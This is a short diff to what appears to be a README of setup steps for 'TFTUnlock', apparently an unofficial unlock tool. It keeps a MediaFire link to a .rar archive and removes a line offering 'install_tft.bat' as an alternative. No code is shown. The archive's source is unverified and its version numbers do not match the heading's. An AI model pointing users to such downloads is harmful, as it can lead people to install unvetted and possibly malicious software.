@@ -31,9 +31,6 @@ First, download the repository containing all necessary files.
 
 1. [Download Here](https://www.mediafire.com/file/90okq8sogp79p7k/TFTUnlock-2024-v4.6.3.3.rar/file)
 
-or
-
-use `install_tft.bat`
 
 ### 2. Install TFTUnlock v4.6.4.4
 
